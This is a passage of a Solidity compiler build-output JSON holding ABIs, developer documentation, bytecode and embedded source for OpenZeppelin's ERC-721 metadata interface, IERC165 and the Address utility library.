{setApprovalForAll}"},"name()":{"details":"Returns the token collection name."},"ownerOf(uint256)":{"details":"Returns the owner of the `tokenId` token. Requirements: - `tokenId` must exist."},"safeTransferFrom(address,address,uint256)":{"details":"Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients are aware of the ERC721 protocol to prevent tokens from being forever locked. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must exist and be owned by `from`. - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}. - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer. Emits a {Transfer} event."},"safeTransferFrom(address,address,uint256,bytes)":{"details":"Safely transfers `tokenId` token from `from` to `to`. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must exist and be owned by `from`. - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}. - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer. Emits a {Transfer} event."},"setApprovalForAll(address,bool)":{"details":"Approve or remove `operator` as an operator for the caller. Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller. Requirements: - The `operator` cannot be the caller. Emits an {ApprovalForAll} event."},"supportsInterface(bytes4)":{"details":"Returns true if this contract implements the interface defined by `interfaceId`. See the corresponding https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] to learn more about how these ids are created. This function call must use less than 30 000 gas."},"symbol()":{"details":"Returns the token collection symbol."},"tokenURI(uint256)":{"details":"Returns the Uniform Resource Identifier (URI) for `tokenId` token."},"transferFrom(address,address,uint256)":{"details":"Transfers `tokenId` token from `from` to `to`. WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721 or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must understand this adds an external call which potentially creates a reentrancy vulnerability. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must be owned by `from`. - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}. Emits a {Transfer} event."}},"title":"ERC-721 Non-Fungible Token Standard, optional metadata extension","version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","getApproved(uint256)":"081812fc","isApprovedForAll(address,address)":"e985e9c5","name()":"06fdde03","ownerOf(uint256)":"6352211e","safeTransferFrom(address,address,uint256)":"42842e0e","safeTransferFrom(address,address,uint256,bytes)":"b88d4fde","setApprovalForAll(address,bool)":"a22cb465","supportsInterface(bytes4)":"01ffc9a7","symbol()":"95d89b41","tokenURI(uint256)":"c87b56dd","transferFrom(address,address,uint256)":"23b872dd"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"approved\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"See https://eips.ethereum.org/EIPS/eip-721\",\"kind\":\"dev\",\"methods\":{\"approve(address,uint256)\":{\"details\":\"Gives permission to `to` to transfer `tokenId` token to another account. The approval is cleared when the token is transferred. Only a single account can be approved at a time, so approving the zero address clears previous approvals. Requirements: - The caller must own the token or be an approved operator. - `tokenId` must exist. Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the number of tokens in ``owner``'s account.\"},\"getApproved(uint256)\":{\"details\":\"Returns the account approved for `tokenId` token. Requirements: - `tokenId` must exist.\"},\"isApprovedForAll(address,address)\":{\"details\":\"Returns if the `operator` is allowed to manage all of the assets of `owner`. See {setApprovalForAll}\"},\"name()\":{\"details\":\"Returns the token collection name.\"},\"ownerOf(uint256)\":{\"details\":\"Returns the owner of the `tokenId` token. Requirements: - `tokenId` must exist.\"},\"safeTransferFrom(address,address,uint256)\":{\"details\":\"Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients are aware of the ERC721 protocol to prevent tokens from being forever locked. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must exist and be owned by `from`. - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}. - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer. Emits a {Transfer} event.\"},\"safeTransferFrom(address,address,uint256,bytes)\":{\"details\":\"Safely transfers `tokenId` token from `from` to `to`. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must exist and be owned by `from`. - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}. - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer. Emits a {Transfer} event.\"},\"setApprovalForAll(address,bool)\":{\"details\":\"Approve or remove `operator` as an operator for the caller. Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller. Requirements: - The `operator` cannot be the caller. Emits an {ApprovalForAll} event.\"},\"supportsInterface(bytes4)\":{\"details\":\"Returns true if this contract implements the interface defined by `interfaceId`. See the corresponding https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] to learn more about how these ids are created. This function call must use less than 30 000 gas.\"},\"symbol()\":{\"details\":\"Returns the token collection symbol.\"},\"tokenURI(uint256)\":{\"details\":\"Returns the Uniform Resource Identifier (URI) for `tokenId` token.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Transfers `tokenId` token from `from` to `to`. WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721 or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must understand this adds an external call which potentially creates a reentrancy vulnerability. Requirements: - `from` cannot be the zero address. - `to` cannot be the zero address. - `tokenId` token must be owned by `from`. - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}. Emits a {Transfer} event.\"}},\"title\":\"ERC-721 Non-Fungible Token Standard, optional metadata extension\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\":\"IERC721Metadata\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC721/IERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/IERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../../utils/introspection/IERC165.sol\\\";\\n\\n/**\\n * @dev Required interface of an ERC721 compliant contract.\\n */\\ninterface IERC721 is IERC165 {\\n    /**\\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\\n     */\\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\\n     */\\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\\n\\n    /**\\n     * @dev Returns the number of tokens in ``owner``'s account.\\n     */\\n    function balanceOf(address owner) external view returns (uint256 balance);\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external;\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Transfers `tokenId` token from `from` to `to`.\\n     *\\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\\n     * The approval is cleared when the token is transferred.\\n     *\\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\\n     *\\n     * Requirements:\\n     *\\n     * - The caller must own the token or be an approved operator.\\n     * - `tokenId` must exist.\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\\n     *\\n     * Requirements:\\n     *\\n     * - The `operator` cannot be the caller.\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function setApprovalForAll(address operator, bool _approved) external;\\n\\n    /**\\n     * @dev Returns the account approved for `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function getApproved(uint256 tokenId) external view returns (address operator);\\n\\n    /**\\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\\n     *\\n     * See {setApprovalForAll}\\n     */\\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\\n}\\n\",\"keccak256\":\"0xab28a56179c1db258c9bf5235b382698cb650debecb51b23d12be9e241374b68\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../IERC721.sol\\\";\\n\\n/**\\n * @title ERC-721 Non-Fungible Token Standard, optional metadata extension\\n * @dev See https://eips.ethereum.org/EIPS/eip-721\\n */\\ninterface IERC721Metadata is IERC721 {\\n    /**\\n     * @dev Returns the token collection name.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the token collection symbol.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.\\n     */\\n    function tokenURI(uint256 tokenId) external view returns (string memory);\\n}\\n\",\"keccak256\":\"0x75b829ff2f26c14355d1cba20e16fe7b29ca58eb5fef665ede48bc0f9c6c74b9\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/Address.sol":{"Address":{"abi":[],"devdoc":{"details":"Collection of functions related to the address type","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122080fee02d62f18fb661f56930df7c1f126654f6b3a78ce5cc32cdcb32151203fd64736f6c63430008070033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP1 INVALID 0xE0 0x2D PUSH3 0xF18FB6 PUSH2 0xF569 ADDRESS 0xDF PUSH29 0x1F126654F6B3A78CE5CC32CDCB32151203FD64736F6C63430008070033 ","sourceMap":"194:8964:5:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122080fee02d62f18fb661f56930df7c1f126654f6b3a78ce5cc32cdcb32151203fd64736f6c63430008070033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP1 INVALID 0xE0 0x2D PUSH3 0xF18FB6 PUSH2 0xF569 ADDRESS 0xDF PUSH29 0x1F126654F6B3A78CE5CC32CDCB32151203FD64736F6C63430008070033 ","sourceMap":"194:8964:5:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"_revert(bytes memory,string memory)":"infinite","functionCall(address,bytes memory)":"infinite","functionCall(address,bytes memory,string memory)":"infinite","functionCallWithValue(address,bytes memory,uint256)":"infinite","functionCallWithValue(address,bytes memory,uint256,string memory)":"infinite","functionDelegateCall(address,bytes memory)":"infinite","functionDelegateCall(address,bytes memory,string memory)":"infinite","functionStaticCall(address,bytes memory)":"infinite","functionStaticCall(address,bytes memory,string memory)":"infinite","isContract(address)":"infinite","sendValue(address payable,uint256)":"infinite","verifyCallResult(bool,bytes memory,string memory)":"infinite","verifyCallResultFromTarget(address,bool,bytes memory,string memory)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Collection of functions related to the address type\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/Address.sol\":\"Address\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Address.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)\\n\\npragma solidity ^0.8.1;\\n\\n/**\\n * @dev Collection of functions related to the address type\\n */\\nlibrary Address {\\n    /**\\n     * @dev Returns true if `account` is a contract.\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * It is unsafe to assume that an address for which this function returns\\n     * false is an externally-owned account (EOA) and not a contract.\\n     *\\n     * Among others, `isContract` will return false for the following\\n     * types of addresses:\\n     *\\n     *  - an externally-owned account\\n     *  - a contract in construction\\n     *  - an address where a contract will be created\\n     *  - an address where a contract lived, but was destroyed\\n     * ====\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\\n     *\\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\\n     * constructor.\\n     * ====\\n     */\\n    function isContract(address account) internal view returns (bool) {\\n        // This method relies on extcodesize/address.code.length, which returns 0\\n        // for contracts in construction, since the code is only stored at the end\\n        // of the constructor execution.\\n\\n        return account.code.length > 0;\\n    }\\n\\n    /**\\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\\n     * `recipient`, forwarding all available gas and reverting on errors.\\n     *\\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\\n     * imposed by `transfer`, making them unable to receive funds via\\n     * `transfer`. {sendValue} removes this limitation.\\n     *\\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\\n     *\\n     * IMPORTANT: because control is transferred to `recipient`, care must be\\n     * taken to not create reentrancy vulnerabilities. Consider using\\n     * {ReentrancyGuard} or the\\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\\n     */\\n    function sendValue(address payable recipient, uint256 amount) internal {\\n        require(address(this).balance >= amount, \\\"Address: insufficient balance\\\");\\n\\n        (bool success, ) = recipient.call{value: amount}(\\\"\\\");\\n        require(success, \\\"Address: unable to send value, recipient may have reverted\\\");\\n    }\\n\\n    /**\\n     * @dev Performs a Solidity function call using a low level `call`. A\\n     * plain `call` is an unsafe replacement for a function call: use this\\n     * function instead.\\n     *\\n     * If `target` reverts with a revert reason, it is bubbled up by this\\n     * function (like regular Solidity function calls).\\n     *\\n     * Returns the raw returned data. To convert to the expected return value,\\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\\n     *\\n     * Requirements:\\n     *\\n     * - `target` must be a contract.\\n     * - calling `target` with `data` must not revert.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, \\\"Address: low-level call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\\n     * `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but also transferring `value` wei to `target`.\\n     *\\n     * Requirements:\\n     *\\n     * - the calling contract must have an ETH balance of at least `value`.\\n     * - the called Solidity function must be `payable`.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, value, \\\"Address: low-level call with value failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        require(address(this).balance >= value, \\\"Address: insufficient balance for call\\\");\\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\\n        return functionStaticCall(target, data, \\\"Address: low-level static call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.staticcall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionDelegateCall(target, data, \\\"Address: low-level delegate call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.delegatecall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\\n     *\\n     * _Available since v4.8._\\n     */\\n    function verifyCallResultFromTarget(\\n        address target,\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        if (success) {\\n            if (returndata.length == 0) {\\n                // only check isContract if the call was successful and the return data is empty\\n                // otherwise we already know that it was a contract\\n                require(isContract(target), \\\"Address: call to non-contract\\\");\\n            }\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\\n     * revert reason or using the provided one.\\n     *\\n     * _Available since v4.3._\\n     */\\n    function verifyCallResult(\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal pure returns (bytes memory) {\\n        if (success) {\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    function _revert(bytes memory returndata, string memory errorMessage) private pure {\\n        // Look for revert reason and bubble it up if present\\n        if (returndata.length > 0) {\\n            // The easiest way to bubble the revert reason is using memory via assembly\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                let returndata_size := mload(returndata)\\n                revert(add(32, returndata), returndata_size)\\n            }\\n        } else {\\n            revert(errorMessage);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf96f969e24029d43d0df89e59d365f277021dac62b48e1c1e3ebe0acdd7f1ca1\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/Context.sol":{"Context":{"abi":[],"devdoc":{"details":"Provides information about the current execution context, including the sender of the transaction and its data. While these are generally available via msg.sender and msg.data, they should not be accessed in such a direct manner, since when dealing with meta-transactions the account sending and paying for execution may not be the actual sender (as far as an application is concerned). This contract is only required for intermediate, library-like 